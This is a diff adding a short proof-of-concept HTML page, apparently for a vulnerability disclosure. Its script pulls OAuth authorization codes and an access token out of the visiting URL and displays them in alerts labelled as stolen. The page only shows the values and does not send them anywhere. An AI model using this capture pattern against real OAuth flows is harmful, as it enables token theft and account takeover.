@@ -1,0 +1,33 @@
+<script>
+    try {
+        var urlParams = new URLSearchParams(window.location.search);
+        var codeValue = urlParams.get('code');
+        var codeValue2 = urlParams.get('privy_oauth_code');
+
+        if (codeValue) {
+            alert('Your token is stolen: ' + codeValue);
+        }
+        if (codeValue2) {
+            alert('Your token is stolen: ' + codeValue2);
+        }
+        
+        var urlp = {};
+        var s = location.toString().split('#')[1];
+
+        if (s) {
+            s = s.split('&');
+            for (var i = 0; i < s.length; i++) {
+                var u = s[i].split('=');
+                urlp[u[0]] = u[1];
+            }
+       
+            if (urlp['access_token']) {
+                alert('VICTIM ACCESS TOKEN: ' + urlp['access_token']);
+            }
+        }
+    } catch (error) {
+        console.error('An error occurred: ', error);
+    }
+</script>
+
+<h1>PwH PoC</h1>
